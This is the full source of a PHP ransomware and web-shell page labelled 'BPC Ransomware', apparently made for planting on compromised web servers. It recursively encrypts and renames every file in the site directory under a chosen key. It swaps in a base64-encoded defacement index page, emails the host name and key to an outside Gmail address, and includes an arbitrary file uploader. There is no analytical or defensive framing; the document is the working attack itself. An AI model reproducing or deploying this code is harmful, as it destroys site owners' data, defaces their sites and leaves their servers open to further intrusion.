<!DOCTYPE html>
<html>
<head>
<title>Baby Ransomware</title>
<style type="text/css">
body {
background: #1A1C1F;
color: #e2e2e2;
}
.inpute{
border-style: dotted;
border-color: #379600;
background-color: transparent;
color: white;
text-align: center;
}
.selecte{
border-style: dotted;
border-color: green;
background-color: transparent;
color: green;
}
.submite{
border-style: dotted;
border-color: #4CAF50;
background-color: transparent;
color: white;
}
.result{
text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
public function shcpackInstall(){
if(!file_exists(".htaDark")){
rename(".htaccess", ".htaDark");
if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex index.php\r\nErrorDocument 404 /index.php")){
echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
}
if(file_put_contents("index.php", base64_decode("PGh0bWw+CTxoZWFkPgkJPHRpdGxlPiBTdHJ1a2UgYnkgRXhjdXRlMTMzNyA8L3RpdGxlPgkJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkJPR09SIEJMQUNLSEFUIiAvPgkJPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IkVzc2VzQ3liZXI3IiAvPgkJPG1ldGEgcHJvcGVydHk9Im9nOmltYWdlIiBjb250ZW50PSIgaHR0cHM6Ly9pLmliYi5jby9zYnBrTFRLLzIwMTkxMDE2LTEzNDIwMS5qcGcgIiAvPgkJPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSIgaHR0cHM6Ly9pLmliYi5jby9zYnBrTFRLLzIwMTkxMDE2LTEzNDIwMS5qcGcgIiAvPgkJPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVJpZ2h0ZW91cyZkaXNwbGF5PXN3YXAiIHJlbD0ic3R5bGVzaGVldCI+CQk8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgkJCUBrZXlmcmFtZXMgZmFkZS1pbnsJCQkJMCV7bWFyZ2luLXRvcDotMTQwMHB4O30JCQkJMTAwJXttYXJnaW4tdG9wOjUwcHg7fQkJCX0JCQlAa2V5ZnJhbWVzIHJvdGF0ZVl7CQkJCTAle3RyYW5zZm9ybTogcm90YXRlWSgwZGVnKTt9CQkJCTEwMCV7dHJhbnNmb3JtOiByb3RhdGVZKDM2MGRlZyk7fQkJCX0JCQlAa2V5ZnJhbWVzIGxldHRlckFuaW17CQkJCTAle3RyYW5zZm9ybTp0cmFuc2xhdGVaKDApO30JCQkJMTAwJXtsZXR0ZXItc3BhY2luZzowLjVlbTt0cmFuc2Zvcm06dHJhbnNsYXRlWig0MDBweCk7fQkJCX0JCQkJCQlib2R5ewkJCQliYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsMCwzMCwxKTsJCQl9CQkJLmxheWVyewkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwkJCQl3aWR0aDogNzMwcHg7CQkJCWhlaWdodDogODAlOwkJCQlib3JkZXI6IDJweCBzb2xpZCAjZmZmOwkJCQlib3JkZXItcmFkaXVzOiAxMDBweDsJCQkJbWFyZ2luLXRvcDogNTBweDsJCQkJbWFyZ2luLWxlZnQ6IDQ5cHg7CQkJCXBhZGRpbmc6IDcwcHg7CQkJCXotaW5kZXg6IDU7CQkJCXBvc2l0aW9uOiBhYnNvbHV0ZTsJCQkJYW5pbWF0aW9uOiBmYWRlLWluIGVhc2UgNHMgMSBhbHRlcm5hdGUgZm9yd2FyZHM7CQkJCWJveC1zaGFkb3c6IDAgMCA0MHB4IHdoaXRlOwkJCX0JCQkubGF5ZXIgLmlseXsJCQkJbWFyZ2luLXRvcDogNDZweDsJCQkJaGVpZ2h0OiA1NTBweDsJCQkJYm9yZGVyLXJhZGl1czogMjBweDsJCQkJYm9yZGVyOiA3cHggc29saWQgI2ZmZjsJCQl9CQkJLmxheWVyIC5pbHk6aG92ZXJ7CQkJCWFuaW1hdGlvbjogcm90YXRlWSBlYXNlIDVzIDEgYWx0ZXJuYXRlIGZvcndhcmRzOwkJCX0JCQkubGF5ZXIgLmhrZHsJCQkJZm9udC1zaXplOiA2MHB4OwkJCQlmb250LWZhbWlseTogJ1JpZ2h0ZW91cycgLCBBcmlhbCAsIENvdXJpZXIgbmV3OwkJCQlmb250LXdlaWdodDogYm9sZDsJCQkJY29sb3I6IHJnYmEoMCwwLDAsMCk7CQkJCS13ZWJraXQtdGV4dC1zdHJva2UtY29sb3I6I2ZmZjsJCQkJLXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDoxcHg7CQkJfQkJCS5sYXllciAuYnVjaW57CQkJCWZvbnQtc2l6ZTogMzBweDsJCQkJZm9udC1mYW1pbHk6IENvdXJpZXI7CQkJCWNvbG9yOiAjZmZmOwkJCX0JCQkubGF5ZXIgLmlseWx7CQkJCWZvbnQtc2l6ZTogOTBweDsJCQkJZm9udC1mYW1pbHk6ICdSaWdodGVvdXMnICwgQXJpYWwgLCBDb3VyaWVyIG5ldzsJCQkJZm9udC13ZWlnaHQ6IGJvbGQ7CQkJCWNvbG9yOiByZ2JhKDAsMCwwLDApOwkJCQktd2Via2l0LXRleHQtc3Ryb2tlLWNvbG9yOnJlZDsJCQkJLXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDoycHg7CQkJfQkJCS5sYXllciAuaWx5bDpob3ZlcnsJCQkJYW5pbWF0aW9uOiBsZXR0ZXJBbmltIGVhc2UtaW4gMXMgMiBhbHRlcm5hdGUgZm9yd2FyZHM7CQkJfQkJPC9zdHlsZT4JPC9oZWFkPgk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CQlhbGVydCgnQk9HT1IgQkxBQ0tIQVQgVEVBTScpOwk8L3NjcmlwdD4JPGJvZHk+CQk8Y2VudGVyPgkJCTxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5yYXdnaXQuY29tL2J1bmdmcmFuZ2tpL2VmZWtzYWxqdS8yYTc4MDVjNy9lZmVrLXNhbGp1LmpzIiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPjwvc2NyaXB0PgkJCTxkaXYgY2xhc3M9ImxheWVyIj4JCQkJPGltZyBzcmM9IiBodHRwczovL2kuaWJiLmNvL3lRVDhETGIvMjAxOTEwMTctMjIzMTUwLmpwZyAiIHdpZHRoPSI2NTAiPgkJCQk8YnI+PGJyPgkJCQk8Zm9udCBjbGFzcz0iaGtkIj5TdHJ1a2UgYnkgQk9HT1IgQkxBQ0tIQVQ8L2ZvbnQ+CQkJCTxicj48YnI+CQkJCTxpZnJhbWUgc3JjPSJodHRwczovL2YudG9wNHRvcC5uZXQvbV8xMjA1eHFzZmQwLm1wMyIgZnJhbWVib3JkZXI9IjAiIGhlaWdodD0iMCIgd2lkdGg9IjAiPjwvaWZyYW1lPgk8YnI+PGJyPgkJCQk8Zm9udCBjbGFzcz0iYnVjaW4iPiBFc3Nlc0N5YmVyNyA6IERvbid0IEZvcmdldCBNZSBTeXN0ZW0gWW91ciBCcm9rZW4gPGNlbnRlcj4gWU9VUiBGQUNFIElTIFBVU1NZPC9mb250PgkJCQk8YnI+PGJyPjxicj4JCQkJPGZvbnQgY2xhc3M9ImlseWwiPkV4Y3V0ZTEzMzcgeCBFc3Nlc0N5YmVyNzwvZm9udD4JCQk8L2Rpdj4JCTwvY2VudGVyPgk8L2JvZHk+PC9odG1sPg"))){
echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> index.php (Default Page)<br>';
}
}
}
public function shcpackUnstall(){
if( file_exists(".htaDark") ){
if( unlink(".htaccess") && unlink("index.php") ){
echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
}
rename(".htaDark", ".htaccess");
}
}
public function plus(){
flush();
ob_flush();
}
public function locate(){
return getcwd();
}
public function shcdirs($dir,$method,$key){
switch ($method) {
case '1':
deRanSomeware::shcpackInstall();
break;
case '2':
deRanSomeware::shcpackUnstall();
break;
}
foreach(scandir($dir) as $d)
{
if($d!='.' && $d!='..')
{
$locate = $dir.DIRECTORY_SEPARATOR.$d;
if(!is_dir($locate)){
if( deRanSomeware::kecuali($locate,"BPC.php") && deRanSomeware::kecuali($locate,".png") && deRanSomeware::kecuali($locate,".htaccess") && deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,"indexa.php") && deRanSomeware::kecuali($locate,".htaLock") ){
switch ($method) {
case '1':
deRanSomeware::shcEnCry($key,$locate);
deRanSomeware::shcEnDesDirS($locate,"1");
break;
case '2':
deRanSomeware::shcDeCry($key,$locate);
deRanSomeware::shcEnDesDirS($locate,"2");
break;
}
}
}else{
deRanSomeware::shcdirs($locate,$method,$key);
}
}
deRanSomeware::plus();
}
deRanSomeware::report($key);
}
public function report($key){
$message.= "========= Satan =========\n";
$message.= "Website : ".$_SERVER['HTTP_HOST'];
$message.= "Key : ".$key;
$message.= "========= BPC Ransomware V2 =========\n";
$subject = "Report Ransomeware";
$headers = "From: Ransomware <adicristal447@gmail.com>\r\n";
mail("adicristal447@gmail.com",$subject,$message,$headers);
}
public function shcEnDesDirS($locate,$method){
switch ($method) {
case '1':
rename($locate, $locate.".BPC");
break;
case '2':
$locates = str_replace(".BPC", "", $locate);
rename($locate, $locates);
break;
}
}
public function shcEnCry($key,$locate){
$data = file_get_contents($locate);
$iv = mcrypt_create_iv(
mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
MCRYPT_DEV_URANDOM
);
$encrypted = base64_encode(
$iv .
mcrypt_encrypt(
MCRYPT_RIJNDAEL_128,
hash('sha256', $key, true),
$data,
MCRYPT_MODE_CBC,
$iv
)
);
if(file_put_contents($locate, $encrypted )){
echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Terkunci</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
}else{
echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Terkunci</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
}
}
public function shcDeCry($key,$locate){
$data = base64_decode( file_get_contents($locate) );
$iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
$decrypted = rtrim(
mcrypt_decrypt(
MCRYPT_RIJNDAEL_128,
hash('sha256', $key, true),
substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
MCRYPT_MODE_CBC,
$iv
),
"\0"
);
if(file_put_contents($locate, $decrypted )){
echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Terbuka</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
}else{
echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Terbuka</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
}
}
public function kecuali($ext,$name){
$re = "/({$name})/";
preg_match($re, $ext, $matches);
if($matches[1]){
return false;
}
return true;
}
}
if($_POST['submit']){
switch ($_POST['method']) {
case '1':
deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
break;
case '2':
deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
break;
}
}else{
?>
<center>
<pre><font style=font-size:140%; align=center> <h1>BPC Ransomware</h1>
<img height="200" src="https://i.screenshot.net/529o4bn"/>
</font></pre>
<br>
-[ Contact : Anonymous@gmail.com ]-<br>
</pre>
<form action="" method="post" style=" text-align: center;">
<label>Key : </label>
<input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
<select name="method" class="selecte">
<option value="1">Locked</option>
<option value="2">Unlock</option>
</select>
<input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>

<br><br><br>

<hr>

<br><br>
<h2><font color='red' face = 'iceland' > Uploader</h2> </font>
<?php
$files = @$_FILES["files"];
if ($files["name"] != '') { 
$fullpath = $_REQUEST["path"] . $files["name"];
if (move_uploaded_file($files['tmp_name'],
$fullpath)) {
echo "<a href='$fullpath' target='_blank'>Akses
untuk $fullpath</a>";
} 
}echo '<form method=POST
enctype="multipart/form-data" action=""><input
type="file" name="files"><input type=submit
value="Fire!"></form></body></html>';?>
<br><br><br>
<font color = 'white'>Cracker By BabyGhost420<br><br>DarkNet Security Hacking. <br><br><br><font color = 'red'>Indonesian cyber Team</font>
</center>
</div>
</body>
</html>


<?php
?>